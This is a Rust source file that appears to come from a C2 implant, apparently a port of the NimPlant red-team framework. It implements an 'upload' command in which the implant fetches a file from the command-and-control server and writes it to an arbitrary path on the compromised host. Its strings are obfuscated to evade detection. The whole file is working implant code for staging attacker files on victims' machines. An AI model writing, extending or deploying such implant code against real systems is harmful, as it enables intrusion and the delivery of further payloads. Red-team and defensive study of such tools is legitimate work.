use fmtools::format; // using obfstr to obfuscate
use std::{fs::File, io::Write};

use crate::internal::client::Client;

// Upload a file from the C2 server to Nimplant
// From NimPlant's perspective this is similar to wget, but calling to the C2 server instead
pub(crate) fn upload(guid: &str, args: &[String], client: &Client) -> String {
    let (file_id, file_path) = match args.len() {
        3 if !args[0].is_empty() && !args[1].is_empty() && args[2].is_empty() => (args[0].clone(), args[1].clone()),
        len if len >= 3 && !args[2].is_empty() => (args[0].clone(), args[2..].join(" ")),
        _ => return format!("Invalid number of arguments received. Usage: 'upload [local file] <optional: remote destination path>'."),
    };

    // Get the file
    let file_buffer = match client.get_file(&file_id, guid) {
        Ok(file_buffer) => file_buffer,
        Err(e) => return format!("Failed to get file from server: "{e}),
    };

    // Write the file to the target path
    match File::create(&file_path) {
        Ok(mut file) => {
            if let Err(e) = file.write_all(&file_buffer) {
                return format!("Failed to write to file '"{file_path}"': "{e});
            }
        }
        Err(e) => return format!("Failed to create file '"{file_path}"': "{e}),
    };

    // Return the result
    format!("Uploaded file to '"{file_path}"'.")
}
